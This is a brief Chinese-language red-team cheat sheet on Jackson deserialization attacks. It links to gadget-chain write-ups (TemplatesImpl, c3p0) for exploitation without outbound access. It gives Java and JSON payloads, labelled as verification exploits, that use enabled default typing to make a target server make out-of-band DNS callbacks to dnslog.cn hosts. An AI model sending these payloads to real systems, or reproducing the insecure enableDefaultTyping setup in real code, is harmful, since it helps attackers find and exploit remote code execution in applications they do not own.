# jackson

http://www.lmxspace.com/2019/07/30/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B1%87%E6%80%BB/

https://www.i4k.xyz/article/caiqiiqi/105193411

https://github.com/cowtowncoder/jackson-compat-minor/

## 不出网利用
1.TemplatesImpl

http://www.lmxspace.com/2019/07/30/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B1%87%E6%80%BB/#TemplatesImpl

2.c3p0

http://redteam.today/2020/04/18/c3p0%E7%9A%84%E4%B8%89%E4%B8%AAgadget/

## 验证存在jackson漏洞

```java
ObjectMapper objectMapper = new ObjectMapper();
objectMapper.enableDefaultTyping();
/**
objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);
objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);
objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE);
objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_CONCRETE_AND_ARRAYS);
*/
String jsonResult = "[\"java.util.HashSet\",[[\"java.net.URL\",\"http://1wc3gw.dnslog.cn\"]]]";
objectMapper.readValue(jsonResult,Object.class);
```
其他exp
```java
["java.net.InetSocketAddress","nqigwr.dnslog.cn"]
["java.net.InetAddress","ap6d50.dnslog.cn"]
```
